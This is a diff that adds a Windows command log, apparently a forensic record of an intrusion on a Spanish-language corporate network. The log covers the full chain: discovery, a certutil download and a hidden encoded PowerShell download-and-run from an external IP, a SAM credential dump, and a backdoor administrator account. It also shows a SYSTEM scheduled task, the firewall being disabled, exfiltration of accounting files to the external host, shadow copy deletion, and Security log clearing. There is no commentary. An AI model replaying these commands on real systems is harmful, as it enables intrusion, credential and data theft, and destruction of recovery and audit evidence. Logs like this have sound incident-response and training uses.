@@ -1,0 +1,30 @@
+2026-09-12 02:11:48  net use \\SRV-FILE01\IPC$ /user:CORP\svc_backup ********
+    Se ha completado el comando correctamente.
+2026-09-12 02:14:07  whoami
+    CORP\svc_backup
+2026-09-12 02:15:22  Event ID: 4625 An account failed to log on. Cuenta: CORP\administrador  Origen: 10.14.7.63
+2026-09-12 02:15:41  Event ID: 4624 An account was successfully logged on. Cuenta: CORP\svc_backup  Tipo de inicio de sesion: 3
+2026-09-12 02:17:09  net user
+    Cuentas de usuario de \\SRV-FILE01
+    Administrador   svc_backup   mlopez   rgarcia
+2026-09-12 02:17:55  netstat -ano
+    TCP    10.14.7.21:49712    185.220.101.7:443    ESTABLISHED    4120
+    TCP    10.14.7.21:445      10.14.7.63:51022     ESTABLISHED    4
+2026-09-12 02:18:30  net view /domain
+    SRV-FILE01   SRV-DC01   PC-CONTABILIDAD
+2026-09-12 02:22:18  certutil.exe -urlcache -split -f http://185.220.101.7/upd.exe C:\ProgramData\svchost-upd.exe
+    CertUtil: -URLCache comando completado correctamente.
+2026-09-12 02:23:40  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANwAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==
+2026-09-12 02:25:11  reg save hklm\sam C:\ProgramData\sam.save
+    La operacion se completo correctamente.
+2026-09-12 02:27:03  net user soporte_adm Verano2026! /add
+2026-09-12 02:27:44  net localgroup administradores soporte_adm /add
+2026-09-12 02:29:10  schtasks /create /tn "ActualizacionSistema" /tr C:\ProgramData\svchost-upd.exe /sc onlogon /ru SYSTEM
+2026-09-12 02:31:02  netsh advfirewall set allprofiles state off
+2026-09-12 02:33:27  7z a C:\ProgramData\cont.zip C:\Compartido\Contabilidad
+2026-09-12 02:36:12  robocopy C:\ProgramData \\185.220.101.7\exfil cont.zip /Z
+    Total   Copiados   Omitidos
+        1          1          0
+2026-09-12 02:36:55  net use \\185.220.101.7\exfil /delete
+2026-09-12 02:41:05  vssadmin delete shadows /all /quiet
+2026-09-12 02:41:38  wevtutil cl Security
